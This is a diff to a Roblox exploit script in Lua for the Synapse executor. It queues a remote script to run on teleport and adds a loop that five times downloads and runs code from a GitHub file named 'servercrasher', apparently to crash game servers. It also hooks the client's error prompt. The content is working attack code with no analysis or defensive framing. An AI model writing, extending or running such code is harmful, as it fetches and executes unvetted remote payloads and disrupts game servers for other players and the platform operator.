@@ -18,8 +18,10 @@ if syn.queue_on_teleport then
         syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/LittleShiQQA/littleshiqqaxds/main/SHA.lua"))()')
     end
 	
-
+for i = 1,5 do
+	wait(2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/servercrasher/main/master.lua"))()
+end
 
 game.CoreGui.RobloxPromptGui.promptOverlay.Changed:Connect(function()
     if game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt") and game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt"):FindFirstChild("MessageArea") then 
